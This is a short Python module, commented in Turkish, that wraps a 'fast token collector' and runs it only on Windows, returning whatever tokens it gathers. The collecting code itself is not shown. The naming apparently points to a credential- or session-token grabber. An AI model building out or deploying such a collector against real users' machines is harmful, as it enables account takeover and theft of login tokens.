"""
Token toplama modülü
"""

from .windows import WindowsChecker
from .tokens import FastTokenCollector

class TokenCollector:
    """Hızlı token toplama"""
    
    def __init__(self):
        self.checker = WindowsChecker()
        self.collector = FastTokenCollector()
    
    def collect_fast(self):
        """Sadece Windows'ta ve hızlıca token topla"""
        if not self.checker.is_windows():
            return []
        
        return self.collector.get_tokens()